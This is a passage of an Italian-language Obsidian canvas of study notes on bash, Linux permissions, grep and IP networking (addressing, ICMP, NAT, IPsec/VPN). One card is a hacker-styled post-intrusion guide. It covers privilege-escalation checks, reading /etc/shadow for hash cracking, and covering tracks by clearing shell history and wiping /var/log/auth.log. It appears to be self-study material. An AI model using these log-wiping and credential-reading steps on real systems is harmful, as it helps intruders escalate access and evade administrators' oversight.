access.log\n```\n\n","x":7866,"y":-2800,"width":759,"height":1164},
		{"id":"5cff47e4f204089c","type":"text","text":"# Bash - Manipolare Cose: `awk`","x":6858,"y":-2696,"width":759,"height":957},
		{"id":"4b0914af8d708d70","type":"text","text":"# **🕵️‍♂️ **\n\nHai appena stabilito una connessione **SSH** con una macchina remota. Il tuo obiettivo ora è **capire dove ti trovi**, **chi sei**, **cosa puoi fare** e **fino a che punto puoi spingerti**. Un hacker esperto deve ottenere **il massimo delle informazioni nel minimo tempo possibile**, quindi seguiamo un approccio **metodico ed efficiente**. 🚀\n\n---\n\n## **📍 1. Dove Mi Trovo? Identificare il Sistema**\n\nLa prima domanda da porsi è: **che macchina è questa?** Potresti essere su un server Linux, un container Docker, una macchina virtuale... e ogni situazione cambia le tue possibilità d’azione.\n\n🔹 **Controllare il sistema operativo e la distribuzione**\n\n```bash\nuname -a   # Versione del kernel e architettura\ncat /etc/os-release  # Nome della distribuzione Linux\ncat /proc/version  # Info dettagliate sul kernel\n```\n\n💡 **Se vedi qualcosa tipo `container` o `lxc` nel kernel, probabilmente sei in un container Docker o LXC!**\n\n🔹 **Dove sei nel filesystem?**\n\n```bash\npwd   # Mostra la tua directory corrente\nls -la  # Lista tutto, inclusi file nascosti\nmount | column -t  # Controlla i filesystem montati\n```\n\n💡 **Se sei in `/home/user` o `/tmp`, probabilmente sei un utente normale. Se sei in `/root`... jackpot!**\n\n---\n\n## **🆔 2. Chi Sono? Controllare i Permessi dell’Utente**\n\n```bash\nwhoami   # Nome dell’utente attuale\nid       # UID, GID e gruppi dell’utente\ngroups   # Quali gruppi sono associati al tuo utente\n```\n\n💡 **Se il tuo UID è `0`, sei root!** Se no, controlla se sei in gruppi **privilegiati** (`sudo`, `docker`, `adm`... questi possono aiutarti a scalare privilegi).\n\n🔹 **Chi è loggato sulla macchina?**\n\n```bash\nwho      # Lista degli utenti connessi\nw        # Chi è connesso e cosa sta facendo\nlast     # Storico degli accessi\n```\n\n💡 **Se vedi admin o root attivi, potresti aspettare che eseguano un comando con `sudo` e provare un attacco di hijacking.**\n\n🔹 **Sto usando un account di servizio o un utente reale?**\n\n```bash\ncat /etc/passwd | grep $(whoami)\n```\n\nSe vedi qualcosa tipo `/bin/bash` o `/bin/sh` alla fine della riga, **sei un utente interattivo**. Se invece vedi `/usr/sbin/nologin` o `/bin/false`, è un account di servizio con accesso limitato.\n\n---\n\n## **🔎 3. Cosa Posso Fare? Capire i Privilegi**\n\n### **🔹 Ho accesso a `sudo`?**\n\n```bash\nsudo -l\n```\n\n💡 **Se puoi eseguire comandi senza password (`NOPASSWD`), potresti ottenere root facilmente!**\n\n### **🔹 Ci sono comandi con `SUID`?**\n\n```bash\nfind / -perm -4000 2>/dev/null\n```\n\n💡 **Se trovi `/bin/bash` con il bit SUID attivo, puoi eseguire una shell con privilegi elevati!**\n\n---\n\n## **📂 4. Esplorare il Filesystem e i Dati Sensibili**\n\n### **🔹 File Importanti da Controllare**\n\n```bash\ncat /etc/passwd  # Lista degli utenti\ncat /etc/shadow  # Hash delle password (richiede root, ma puoi provare...)\ncat /etc/sudoers  # Configurazione sudo\nls -la /root/  # Vedi cosa c'è nella home di root (se puoi)\n```\n\n💡 **Se hai accesso a `/etc/shadow`, puoi tentare di craccare le password con John the Ripper o Hashcat.**\n\n### **🔹 File con permessi deboli**\n\n```bash\nfind / -type f -perm -o+w 2>/dev/null  # File scrivibili da chiunque\nfind / -type d -perm -o+w 2>/dev/null  # Directory scrivibili da chiunque\n```\n\n💡 **Se un file di configurazione critico è scrivibile da te, potresti modificarlo per ottenere accesso elevato!**\n\n---\n\n## **📡 5. Controllare la Rete e il Contesto**\n\nSe sei entrato via **SSH**, probabilmente il sistema è **parte di una rete più grande**. Potresti cercare altre macchine vulnerabili da attaccare.\n\n🔹 **Quali interfacce di rete ci sono?**\n\n```bash\nip a\n```\n\n💡 **Se vedi un IP privato (`192.168.x.x`, `10.x.x.x`), potresti essere in una rete interna con altre macchine interessanti!**\n\n🔹 **Quali connessioni sono attive?**\n\n```bash\nnetstat -tulnp  # Mostra porte aperte e processi associati\nss -tulnp       # Alternativa più moderna a netstat\n```\n\n💡 **Se vedi servizi con porte aperte, potresti attaccarli per espandere il tuo accesso.**\n\n🔹 **Quali processi stanno girando?**\n\n```bash\nps aux --sort=-%mem  # Processi ordinati per uso memoria\nps aux --sort=-%cpu  # Processi ordinati per uso CPU\n```\n\n💡 **Se vedi un servizio con privilegi elevati, potresti provare un attacco tramite privilege escalation.**\n\n---\n\n## **🎭 6. Rimanere Invisibili**\n\nSe sei entrato in un sistema e vuoi **minimizzare le tracce**, ci sono alcune tecniche per coprire il tuo ingresso.\n\n🔹 **Pulire la cronologia della shell**\n\n```bash\nhistory -c && history -w\n```\n\n🔹 **Disabilitare la cronologia temporaneamente**\n\n```bash\nunset HISTFILE\nexport HISTSIZE=0\nexport HISTFILESIZE=0\n```\n\n🔹 **Eliminare i log SSH**\n\n```bash\n> ~/.bash_history\necho \"\" > /var/log/auth.log  # Richiede privilegi elevati\n```\n\n💡 **Tieni a mente:** Se sei in un ambiente monitorato, potrebbero comunque accorgersi di movimenti sospetti.\n\n---\n\n## **🚀 Conclusione: La Prima Mossa È Capire il Campo di Battaglia**\n\nOra sai **come raccogliere rapidamente informazioni su un sistema** una volta dentro via SSH.\n\n✅ **Dove sei?** Controlla il sistema operativo, il filesystem e la rete.  \n✅ **Chi sei?** Determina i tuoi privilegi e i gruppi a cui appartieni.  \n✅ **Cosa puoi fare?** Scansiona permessi, file sensibili, processi e accessi di rete.  \n✅ **Come coprirti?** Ripulisci tracce, disabilita log e cronologia.\n\n🔎 **Vuoi ora esplorare le tecniche di privilege escalation per ottenere root?** 😈","x":2820,"y":3894,"width":759,"height":4049},
		{"id":"acec287a5d504ba6","type":"text","text":"💡 **Trucco da hacker:** Puoi usare `pushd` e `popd` per **salvare e ripristinare rapidamente** la tua posizione.\n\n```bash\npushd /etc  # Salva la posizione corrente e vai in /etc\npopd        # Torna alla directory precedente\n```\n\n### **🔎 `which`, `whereis`, `type` - Trovare comandi**\n\n```bash\nwhich ls  # Percorso del comando 'ls'\nwhereis ls  # Mostra anche il manuale e i binari collegati\ntype ls  # Dice se è un comando built-in o esterno\n```\n\n💡 **Perché `cd` non ha un percorso?** Perché è un comando **interno** alla shell!\n\n---\n\n## **📜 5. Leggere File Importanti del Sistema**\n\n### **🛠 File fondamentali in `/etc`**\n\n- `/etc/passwd` → Utenti del sistema\n- `/etc/shadow` → Password criptate degli utenti\n- `/etc/hosts` → Mappatura IP ↔ Hostname\n- `/etc/fstab` → File system montati all'avvio\n\n```bash\ncat /etc/passwd  # Mostra utenti\ncat /etc/shadow  # Richiede permessi di root (password criptate)\ncat /etc/hosts  # Controlla domini personalizzati\n```\n\n---\n\n## **💣 6. Tecniche Avanzate e Trucchi da Hacker**\n\n🔹 **Montare filesystem manualmente**\n\n```bash\nmount /dev/sdb1 /mnt  # Monta una partizione\numount /mnt  # Smonta la partizione\n```\n\n💡 **Utile se trovi un disco USB e vuoi esplorarne il contenuto senza autorun.**\n\n🔹 **Controllare i processi e il filesystem in `/proc`**\n\n```bash\nls -l /proc/[PID]  # Esplora i dettagli di un processo specifico\ncat /proc/mounts  # Vedi i filesystem montati\n```\n\n💡 **Il `/proc` non è un filesystem reale, ma un’interfaccia per il kernel!**\n","x":1820,"y":3894,"width":759,"height":1182},
		{"id":"049e5ead3118c000","type":"text","text":"# Permessi Speciali & Access Control List (ACL)\n\nPotrei trovare cose diverse rispetto alla `x`, nei vari punti in cui dovrebbe comparire.\n\n- ***Set User ID*** (***SUID***) - Se trovo una `s` al posto della `x` sui permessi dell'`owner` significa che il `file` viene sempre eseguito con i privilegi dell'`owner`. Questo avviene ad esempio con `/usr/bin/passwd`, programma che serve a cambiare le password;\n\t- Aggiungo e rimuovo il `SUID` con `chmod u+s` e `chmod u-s`.\n- ***Set Group ID*** (***SGID***) - Se trovo una `s` al posto della `x` sui permessi del `group`, il `file` viene eseguito con i permessi del `gruppo`, e.g. tutti i file creati in una `directory` con `SGID` attivo erediteranno il gruppo della `directory` invece di quello del creatore;\n\t- Aggiungo e rimuovo il `SUID` con `chmod g+s dir` e `chmod g-s dir`;\n\t- Faccio questo esempio perché `SGID` tipicamente si usa sulle `directories`, mentre `SUID` si usa tipicamente sui `files` standard.\n- ***Sticky Bit*** - Se trovo una `t` al posto della `x` sui permessi degli `others` sto sicuramente guardando una `directory`, e l'effetto è il seguente: solo l'`owner` (e `root`, ovviamente) può cancellare/rinominare i file che compaiono nella `directory`.\n\t- Aggiungo e rimuovo `Sticky Bit` con `chmod +t dir` e `chmod -t dir`;\n\t- Utile per `directories` condivise, e.g. in `/tmp`.\n\nQuesti tre permessi speciali hanno a loro volta un trio di bit che definiscono se sono attivi o meno, nell'ordine `SUID SGID Sticky Bit`. `4xxx` indica un file con `SUID` attivo, `2xxx` analogo con `SGID` e `1xxx` analogo con `Sticky Bit`. Si sommano come i permessi standard (e.g. `6xxx` indica un oggetto con `SUID` e `SGID` entrambi attivi).\n\nInfine è possibile aggiungere permessi personalizzati per utenti e gruppi singoli tramite ***Access Control List*** (***ACL***). Controllo i permessi specifici con `getfacl file`, e li setto con\n\n```bash\nsetfacl [action] [target][permissions] [file]\n```\n\ndove `action` può essere un'aggiunta (`-m`) o una rimozione (`-x`), `target` può essere sia un `owner` (`u:username`) sia un gruppo (`g:groupname`) e i permessi sono i classici `rwx`.\n\nNota che questi permessi speciali non si vedono con `ls -l`, devo sempre usare `getfacl`.","x":1820,"y":-166,"width":759,"height":958,"color":"4"},
		{"id":"52300a2aca6a3d2b","type":"text","text":"# Significato dei Permessi\n\nÈ chiaro cosa significa leggere, scrivere ed eseguire un `file`. Ma con una `directory`?\n\n- Leggere una `directory` significa listare il suo contenuto con `ls`. Questo include l'uso di `tab` per l'autocompletamento di un percorso;\n- Scrivere una `directory` significa creare, rimuovere o eliminare `file` in essa contenuti;\n- Eseguire una `directory` significa entrarci con `cd`. Questo include ***attraversarla***, i.e. se non sono autorizzato `x` e voglio accedere ad una cartella interna per la quale ho invece tutti i permessi, non posso farlo!\n\t- Questo limita anche il comando `ls`, che potrà solo listare i `file` senza poter visualizzare i dettagli (che appariranno come tanti simpatici `?`);\n\t- Se ho il permesso `x` ma non `r` e voglio attraversare la `directory` per giungere in luoghi sui quali ho autorizzazioni, posso farlo solo se conosco l'esatto `path` di destinazione (non posso usare `tab`!).\n\nNota che i permessi sui `file` e sulle `directory` sono completamente indipendenti. Posso ad esempio modificare un `file` su cui ho il permesso `w` che si trova in una `directory` in cui non ce l'ho (perché non lo sto rimuovendo o rinominando).\n\nPer gli altri tipi di `inodes` il significato è simile a quello dei `files` standard (nei symlink i permessi sono sostanzialmente dei placeholder, dipende dal file puntato).\n\nIndipendentemente dai permessi, il `superuser` è sempre in grado di fare quello che vuole.\n\nIl senso di tutto questo si vede analizzando i `gruppi`: chi è nel gruppo `dialout`, ad esempio, ha di norma i permessi per accedere ai dispositivi seriali. In modo analogo, `video` è il gruppo con i permessi per la `GPU` e simili, `shadow` ha accesso alle password (crittate).","x":1820,"y":-1249,"width":759,"height":847,"color":"4"},
		{"id":"2e2f2fffcb29a514","type":"text","text":"# Bash - Trovare Cose nei `file`: `grep`\n\n`grep - Global Regular Expression Print` è un altro dei comandi più potenti di Linux. ***Trova cose dentro ai file***.\n\n```bash\ngrep [options] pattern [file(s)]\n```\n\n`pattern` è una ***stringa*** o una ***regex***.\n\n- `pattern = \"^error\"` restituirà solo le occorrenze di `error` ad inizio riga. Analogo `\"error$\"` a fine riga;\n- `.` rappresenta un qualsiasi carattere singolo, `*` significa `0 o più occorrenze`, `[]` delimitano una classe di caratteri (e.g. `[0-9]*` significa `qualsiasi numero di cifre`);\n- Le parentesi `()` si usano per definire i gruppi di caratteri (e.g. `(ab)*`);\n\nPosso specificare più `file(s)` con le `wildcards`, mentre le opzioni...\n\n- `Ax`, `-By` - Mostrano rispettivamente `x` righe dopo il match e `y` righe prima;\n- `-c` - Restituisce il numero di righe che contengono il `pattern`;\n- `-E` estende le regex, permettendo di usare gli operatori `+` (`1 o più occorrenze`), `?` (`nessuno o un carattere qualsiasi`) e `|` (`OR logico`);\n\t- Posso usare direttamente il comando `egrep`$\\iff$ `grep -E`.\n- `-F` - Se invece voglio cercare una roba che sembra una regex ma non lo è (e.g. l'esatta occorrenza \"`.hello?`\", dove `.` è davvero un punto e `?` è davvero un punto interrogativo), devo disattivare l'interpretazione automatica delle regex, con `-F`;\n\t- Ottengo lo stesso risultato con il comando `fgrep`$\\iff$ `grep -F`.\n- `-o` - Mostra solo il match, non l'intera riga (utile se faccio una ricerca con una regex);\n- `-i` - Ignora la differenza tra maiuscole e minuscole;\n- `-r` - Ricerca ricorsivamente in tutte le sottodirectory, se `[file(s)]` è una `directory`;\n- `-v` - Inverte la ricerca, i.e. mostra solo le righe che ***non*** contengono `pattern`;\n- `-l` - Mostra solo i nomi dei file che contengono il pattern (e.g. utile con `-r`);\n\t- `-H` invece mostra ***anche*** il nome del file.\n- `-n` - Restituisce il numero di riga a cui è stato trovato il `pattern`;\n- `-w` - Trova solo le occorrenze esatte di `pattern` (e.g. mentre di norma se cerco `error` trovo anche cose tipo `error10`, con `-w` mi limito alle sole occorrenze di `error` isolato).\n","x":4838,"y":-165,"width":759,"height":957,"color":"4"},
		{"id":"4f8240ee05d14bd3","type":"text","text":"# Come comunicano i Router? (ICMP)\n\nCome faccio a sapere se un router è online? Se il `TTL` è scaduto? Come stimo *RTT*?\n\nPer tutte queste domande (e molto altro) esiste un simpatico e snello protocollo che viaggia direttamente come *payload* di IP. Serve tendenzialmente a comunicare tra il router e chi gli ha mandato il pacchetto.\n\nConsta di $4\\,byte$ più eventuali dati, così suddivisi:\n\n- ***Tipo*** - i primi $8\\,bit$ sono dedicati alla tipologia di messaggio, ad esempio\n\t- $0$ - Risposta *echo* (\"`ci sono!`\");\n\t- $3$ - Destinazione Irraggiungibile;\n\t- $8$ - Richiesta *echo* (\"`ci sei?`\");\n\t- $30$ - Dedicato a Traceroute;\n- ***Codice*** - i successivi $8\\,bit$ specificano l'informazione del Tipo. Per la maggior parte dei Tipi esiste solo il codice $0$, ma ad esempio per il Tipo $3$ abbiamo codici\n\t- $0$ - Rete non raggiungibile\n\t- $1$ - Host non raggiungibile\n\t- $3$ - Porta di destinazione non raggiungibile (\"su questa porta non c'è alcun servizio\");\n\t- $7$ - Host di destinazione sconosciuto;\n- Gli ultimi $16\\,bit$ sono un checksum.\n\n***Traceroute*** è un abuso di ICMP: si invia una sequenza di datagrammi UDP con un numero di porta tipicamente non usato per UDP. Prima mando `TTL = 1`, il primo router lo scarta e risponde ICMP, il che include l'IP del router che l'ha scartato. Poi `TTL = 2`, e così via. Quando arrivo a destinazione, il server non ha un servizio attivo su quella porta, quindi ricevo un \"porta irraggiungibile\" e so di aver finito. Così trovo la gente anche se non accetta i ping. I router possono anche decidere di non rispondere: non sto mandando ping, sono loro che decidono di rispondere al fatto che un pacchetto è stato scartato.\n\n\n\nEsiste, un po' diverso, anche a livello di IPv6. È utile perché non essendoci frammentazione mi interessa trovare l'MTU minimo del percorso, e lo faccio tramite un algoritmo che sfrutta ICMPv6 (***PathMTUDiscovery***).","x":-17388,"y":835,"width":780,"height":983,"color":"4"},
		{"id":"d76be3d4d10ad0c4","type":"text","text":"# Come fa un ISP ad ottenere un range di indirizzi IP?\n\nLa Grande Madre degli IP è l'***ICANN*** (**Internet Corporation for Assigned Names and Numbers**).\n\nQuesta gestisce l'intero spazio degli indirizzi IP a livello globale, assegnandoli in macro-blocchi a 5 ***Regional Internet Registers*** (**ARIN** Nord America, **RIPE NCC** Europa, Medio Oriente e parti dell'Asia Centrale, **APNIC** Asia-Pacifico, **LACNIC** America Latina e i Caraibi, **AFRINIC** Africa).\n\nGli ISP comprano i range di indirizzi dai RIR, dividendoli in blocchi e vendendoli alle organizzazioni.\n```\n11001000 00010111 0001yyyx xxxxxxxx <--> 200.23.16.0/20   # Comprato dall'ISP\n```\nIpotizziamo di volerli dividere in 8 blocchi, indicizzabili con 3 bit (`yyy`). Allora abbiamo\n```\n11001000 00010111 0001000x xxxxxxxx <--> 200.23.16.0/23   # Comprato da Organizzazione 1\n11001000 00010111 0001001x xxxxxxxx <--> 200.23.18.0/23   # Comprato da Organizzazione 2\n[...]\n11001000 00010111 0001111x xxxxxxxx <--> 200.23.30.0/23   # Comprato da Organizzazione 8\n```\nIn pratica, gli ISP pagano i RIR, i quali pagano l'ICANN, la quale investe in manutenzione della rete, sicurezza, ricerca e sviluppo (e.g. TLD del DNS). Gli ultimi indirizzi IPv4 sono stati assegnati ai RIR nel 2011. Ad oggi, IPv4 si tiene in piedi grazie al NAT, ed è in corso il passaggio a IPv6. ","x":-18554,"y":99,"width":916,"height":600,"color":"4"},
		{"id":"3ce011a34d648316","type":"text","text":"# Frammentazione IPv4\n\nI protocolli del livello di Collegamento prevedono una dimensione massima del frame, oltre la quale è necessario \"spezzarlo\" in due $\\Rightarrow$ ***Maximum Transmission Unit*** (e.g. $MTU_{\\text{Ethernet}} = 1500 byte$).\n\nSe ad IPv4 arriva un pacchetto troppo grande, deve spezzarlo. Se il datagramma iniziale era lungo `length = 4000` devo dividerlo in 3 datagrammi più piccoli, rispettivamente\n\n1. `length = 1500, fragflag = 1, offset = 0`;\n2. `length = 1500, fragflag = 1, offset = 185`;\n3. `length = 1500, fragflag = 0, offset = 370`.\n\nSi vede bene che la frammentazione è gestita da due campi dell'header:\n\n- `fragflag` - se  `= 1` significa \"ciao, sono solo un pezzo di un datagramma più grande, dopo di me ne arriverà un altro, se sei il destinatario ci devi riassemblare grazieprego\";\n- `offset` -  tiene traccia di dove sono arrivato rispetto al messaggio iniziale, e si conta in ottetti di byte. Il primo *payload* è di $1480\\,byte$, quindi il secondo partirà dall'ottetto $1480/8 = 185$. In pratica potevano sostituirli con dei numeri progressivi, ma le cose facili non ci piacciono.\n\nQuesti tre datagrammi sono indipendenti dal punto di vista della Rete, e possono potenzialmente prendere percorsi differenti a livello di routing. L'unico a cui interessano questi campi è il destinatario, al quale spetta il compito di usarli per riassemblare il datagramma originale.\n\nIPv6 vieta la frammentazione, esplora il livello di Collegamento per trovare $MTU_{\\text{min}}$ e capire quanto grande può mandare i pacchetti. Notare che, di nuovo, viola il principio di divisione dei layer.","x":-20560,"y":612,"width":814,"height":643,"color":"4"},
		{"id":"9ef9565d73660350","type":"text","text":"upper layer protocol specifica cosa c'è dentro il payload (TCP, UDP, OSPF 89, ...)","x":-20389,"y":1687,"width":472,"height":116},
		{"id":"72d78acc98f57a75","type":"text","text":"# Indirizzi IPv4\n\nIdentificativo a $32\\,bit$ ($2^{32}$ indirizzamenti) pensato originariamente per individuare univocamente ogni interfaccia di rete (e.g. cavo Ethernet) di ogni nodo. Adotta un notazione decimale puntata.\n\n```\ne.g. 11011111 00000001 00000001 00000001 = 223.1.1.1\n```\n\nIn pratica, l'IP non è né *hard-coded* né specifico del dispositivo di rete. Si tratta di un indirizzo\n- ***logico*** - individua la ***posizione*** dell'interfaccia all'interno della rete (non l'interfaccia in sé);\n- ***dinamico*** - proprio in virtù del suo individuare una posizione lo stesso dispositivo può avere IP diversi a seconda di dove si trova.\n\nQuesto suggerisce di costruire l'IP in modo ***gerarchico***. La struttura degli indirizzi IP viene oggi definita dal **Classless Inter Domain Routing** (***CIDR***, 1993), e si può dividere in due parti:\n\n- Una prima parte (***prefisso***) identifica la ***sottorete*** (***subnet***).\n\t- Se due host possono raggiungersi fisicamente senza attraversare un router (e quindi senza entrare propriamente in Internet) si definiscono essere all'interno di una *sottorete*;\n\t- In generale, sono *sottoreti* tutti i gruppi di host che risultano ancora interconnessi anche togliendo i router dalla rete;\n- Una seconda parte (***host***) che identifica l'interfaccia all'interno della sottorete.\n\nPer sapere quando è lungo il prefisso e quanto l'host si possono usare due notazioni:\n\n- `223.1.1.0/24` o `223.1.1/24`- indica che i primi 24 bit sono prefisso (subnet `11011111 00000001 00000001 = 223.1.1`), e i restanti 8 sono interfacce interne a quella sottorete (ce ne possono essere fino a 256, corrispondenti ai valori dell'ultimo ottetto da `0` a `255`);\n\t- Questa notazione è un po' più *human-friendly*;\n- `IP = 223.1.1.0` `subent_mask = 255.255.255.0` - indica la stessa identica cosa dell'esempio precedente, ma usando una ***maschera di sottorete*** (***subnet mask***). Molto utile a livello computazionale: `255.255.255.0 = 11111111 11111111 11111111 00000000`, notiamo che\n\t- `IP` $\\land$ `subnet_mask` = `prefisso`;\n\t\t- Il `prefisso` è anche il primo indirizzo della sottorete;\n\t\t- Se ho un `IP_destinazione` a cui voglio comunicare, mi basta fare l'$and$ con `subnet_mask` e confrontare con la mia sottorete (ottenuta in modo analogo con il `mio_IP`) per sapere se sto parlando in locale o devo passare per il ***gateway***;\n\t- $\\neg($`subnet_mask`$)+  1  =$ quanti indirizzi IP ci sono in questa sottorete;\n\t- `IP` $\\lor\\,(\\neg($`subnet_mask`$)) =$  ultimo indirizzo della sottorete ($\\Rightarrow$ broadcast sulla sottorete).\n\n","x":-19580,"y":99,"width":814,"height":1156,"color":"4"},
		{"id":"fc31d285a8ba2ad3","type":"text","text":"# Internet Protocol (IP)\n\nProtocollo standard *de facto* del livello di Rete. Definisce il formato del ***datagramma***, come frammentare/ricostruire i pacchetti che superano l'MTU Ethernet e la struttura degli ***indirizzi IP***.\n\n\n\n","x":-19580,"y":1364,"width":814,"height":181,"color":"4"},
		{"id":"a35f9569f0925a3a","type":"text","text":"# Data Plane\n\nA livello locale, il data plane si preoccupa di gestire il (***de)multiplexing logico e fisico dei singoli router*** ($\\Rightarrow$ associare a ogni informazione in ingresso l'uscita adeguata). Ciò avviene tramite una ***tabella di corrispondenze***, ed è detto ***forwarding***.\n\n","x":-19580,"y":1659,"width":814,"height":211,"color":"6"},
		{"id":"1f7d268a16eedc89","type":"file","file":"3 - Rete/IPv4.png","x":-20511,"y":1288,"width":716,"height":334},
		{"id":"ef01ecee9344c97a","type":"file","file":"3 - Rete/ICMP.png","x":-16188,"y":1168,"width":400,"height":317},
		{"id":"bbd22089bc42007f","type":"text","text":"# IP Sec e VPN\n\nLayer di sicurezza direttamente su IP. Può agire in due modi:\n\n- ***Authentication Header Protocol*** (***AH***) - Cifra il payload del datagramma. Questo porta problemi con i NAT, che controllano l'integrità del messaggio con una funzione di hash (la modifica del solo payload rompe il digest). Poco usato;\n- ***Encapsulation Security Protocol*** (***ESP***) - Detta ***modalità tunnel*** o più comunemente ***Virtual Private Network*** (***VPN***). Cifra l'intero datagramma e lo incapsula in un altro, sostituendo le vere informazioni end-to-end tra gli host con quelle end-to-end dei router della VPN. Solo a destinazione il datagramma originale viene riesumato, motivo per cui chi legge il traffico non vede l'IP dell'host che lo ha inviato, ma solo quello del router VPN.\n\nQuando si parla di IPsec ci si riferisce in pratica alla seconda modalità d'uso.\n\nSi può intuire che mentre IP è stateless ***IPsec crea una connessione***. Quando ciò avviene, il router di partenza $R_1$ invia al router di arrivo $R_2$ un set di ***Security Associations*** (***SAs***), che include chiavi si sessione e quant'altro. Una sorta di handshaking unidirezionale, i cui risultati vengono salvati in due distinti DB:\n\n- ***Security Policy Database*** (***SPD***) - Contiene le informazioni relative a quando e se usare IPsec, nonché quale SA usare. In pratica **sa cosa fare**;\n- ***Security Association Database*** (***SAD***) - Contiene le informazioni relative alle varie SAs, su come trattare i datagrammi in uscita e quelli in ingresso. In pratica **sa come farlo**.\n\nA questo punto aggiunge del padding in coda al datagramma originale (per evitare attacchi di tipo ***deep packet inspection***, in cui deduco informazioni sul messaggio dalla sua lunghezza) e cifra il tutto con la chiave simmetrica.\n\nAggiunge quindi header ESP che specifica l'ID del tunnel e il numero di sequenza del pacchetto. Questo, insieme al MAC aggiunto in coda, evita gli attacchi replay: ricevere un duplicato farà cadere la connessione.\n\nInfine, aggiunge il nuovo header IP e invia il datagramma.\n\nQualunque agente esterno tra $R_1$ ed $R_2$ non può fare assolutamente niente rispetto al messaggio originale (se non eventualmente far cadere la connessione).","x":-16378,"y":-292,"width":780,"height":991,"color":"#4545ff"},
		{"id":"9b371b4161e579d9","type":"text","text":"# Quanto è affidabile una VPN?\n\nPer quanto sembri impeccabile, c'è un unico punto di failure: chi controlla la VPN ha tutti i dati. Mi devo fidare della VPN, perché sa tutto quello che mando.\n\nNon che rivendano i dati, ma possono bussare alla porta quelli dell'FBI. E se succede non possono neanche dirlo al pubblico, ma c'è uno stratagemma: usare una cosiddetta \"dichiarazione canarino\", ovvero un sito la cui sola presenza online è un messaggio del tipo \"se questa pagina esiste ancora allora i servizi segreti non sono ancora entrati\".\n\nOgni azienda che offre una VPN deve rispondere alle leggi del proprio paese. In genere conviene usare una VPN svizzera (o meglio ancora Panama).\n\n- USA, UK, Canada, Australia e Nuova Zelanda formano ***I Cinque Occhi***, un'alleanza internazionale per la condivisione di informazioni di intelligence, in particolare circa la sorveglianza elettronica. Possono essere fatte richieste invasive ai provider di VPN;\n- Se aggiungiamo Danimarca, Francia, Paesi Bassi e Norvegia otteniamo ***I Nove Occhi***;\n- Se aggiungiamo anche Germania, Belgio, ***Italia***, Spagna e Svezia arriviamo a ***Quattordici Occhi***, ma come ogni fazione che riguarda l'Italia sembra essere un po' più easy delle altre.","x":-15447,"y":179,"width":757,"height":520,"color":"#4545ff"},
		{"id":"9290043c9f3df071","type":"file","file":"VPN.png","x":-15338,"y":-161,"width":539,"height":197},
		{"id":"7a683155fe19cadc","type":"text","text":"# Quindi cosa devo usare?\n\nDipende da cosa devi fare. Se devi creare una singola connessione che parte dall'interno della LAN non ci sono problemi.\n\n|                                                                                                                     | NAT Statico | NAT Dinamico | PAT Statico                  | PAT Dinamico                 |\n| ------------------------------------------------------------------------------------------------------------------- | ----------- | ------------ | ---------------------------- | ---------------------------- |\n| Assegna l'IP in modo deterministico?                                                                                | Sì          | No           | Sì                           | Dipende dalla configurazione |\n| Posso avviare la comunicazione dall'esterno (i.e. ha senso metterci dietro un server)?                              | Sì          | No           | Sì                           | No                           |\n| Una volta che fuori conoscono il mio IP, posso creare facilmente una connessione a doppio canale (e.g. Active FTP)? | Sì          | Sì           | Va scritto in modo esplicito | No                           |\n| Protegge bene da un *NAT Traversal*?                                                                                | No          | Circa        | No                           | Sì                           |\n\nTutte queste decisioni vengono prese guardando soltanto l'`IP_Sorgente`. Posso prendere decisioni anche a seconda dell'`IP_Destinazione` (***Policy NAT***).\n```\nif source 192.168.1/24 and destination 100.1.1.1\n\t192.168.1/24 > 200.1.1.1\n\nif source 192.168.1/24\n\t192.168.1/24 > 200.1.1.5\n```\nInoltre posso tradurre anche la destinazione (***Twice NAT***). Se ad esempio cerco un server DNS, il router aziendale può reindirizzarmi da `8.8.8.8` (check sulla destinazione, quindi usando *Policy NAT*) al proprio server DNS (e.g. `static NAT destination to 80.80.80.80`).","x":-16378,"y":-1181,"width":780,"height":815,"color":"4"},
		{"id":"8d45a43704e34f6f","type":"text","text":"# Tipi di NAT e Port Address Translation (PAT)\n\nIn realtà questa descrizione di NAT è un po' superficiale e serve solo a capire il meccanismo generale. Il NAT è la traduzione degli indirizzi IP privati in pubblici, non delle porte.\n\n- Un ***NAT Statico*** mappa *one-to-one* gli `IP_Host` agli `IP_NAT` disponibili tramite delle direttive *hard-coded* dall'admin di rete (e.g. `192.168.1.165` -> `200.1.1.1`). In questo caso, ogni assegnazione viene dichiarata esplicitamente;\n- Un ***NAT Dinamico*** fa la stessa cosa, ma in modo più flessibile. Una direttiva può essere `192.168.1.0\\24 will share 200.1.1.1 through 200.1.1.5`, ovvero \"quando un host `192.168.1.xxx` manda una richiesta per Internet, assegnagli un indirizzo casuale tra quelli disponibili nel range \\[`200.1.1.1`, `200.1.1.5`\\]\".\n\nIn entrambi i casi, il numero di `Host` che si possono collegare dietro NAT è limitato dal numero di indirizzi `IP_NAT` disponibili, perché il **NAT opera solo a livello di Rete**. Mappare diversi `IP_Host` in uno stesso `IP_NAT` pubblico (***IP*** (o ***NAT***) ***Overloading***) è possibile solo se si usano le porte per demultiplexare. Questo significa usare anche un ***Port Address Translation*** (***PAT***). Usare insieme *NAT* e *PAT* è a rigore indicato come ***NAPT***, ma dato che cambiare solamente la porta è una pratica abbastanza inusuale si usa semplicemente **PAT come sinonimo di NAPT.** Poi in pratica la gente è ignorante e usa *NAT* per indicare tutto. Dal momento che questa tecnica permette di nascondere l'`IP_Host` è anche nota come ***IP Masquerading***. Anche qui distinguo\n\n- ***PAT Statico*** - Sostituisce sempre una certa coppia `IP_Host Porta_Host` con la stessa coppia `IP_PAT Porta_PAT` (e.g. `192.168.1.165 8080` -> `200.1.1.1 80`). Questo consente di rendere un ***server*** disponibile dall'esterno sempre sulla stessa coppia `IP Porta`;\n\t- Cambiare la porta permette al server di ascoltare su porte non-standard (e.g. ascolto `HTTP` sulla `Porta_Server = 8080`, ma traduco in `Porta_PAT = 80`. Le richieste client da browser vanno in automatico sulla `Porta 80`, il *PAT* me le reindirizza su `8080`);\n- ***PAT Dinamico*** - Fa la stessa cosa, ma la `Porta_PAT` è scelta in modo casuale tra quelle disponibili. Il comportamento esatto è quello del riquadro a fianco.\n","x":-17398,"y":-1181,"width":790,"height":815,"color":"4"},
